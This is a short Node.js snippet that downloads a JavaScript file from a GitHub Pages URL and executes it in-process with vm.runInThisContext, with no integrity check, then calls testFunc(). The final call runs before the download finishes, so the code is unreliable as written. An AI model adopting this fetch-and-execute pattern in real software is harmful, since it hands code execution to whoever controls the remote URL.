const http = require("https"),
  vm = require("vm");

["https://makannew.github.io/kick-start-helpers/index.js"].forEach((url) => {
  http.get(url, (res) => {
    if (
      res.statusCode === 200 &&
      /^text\/javascript/.test(res.headers["content-type"])
    ) {
      let rawData = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => {
        rawData += chunk;
      });
      res.on("end", () => {
        vm.runInThisContext(rawData, url);
      });
    }
  });
});

console.log(testFunc());
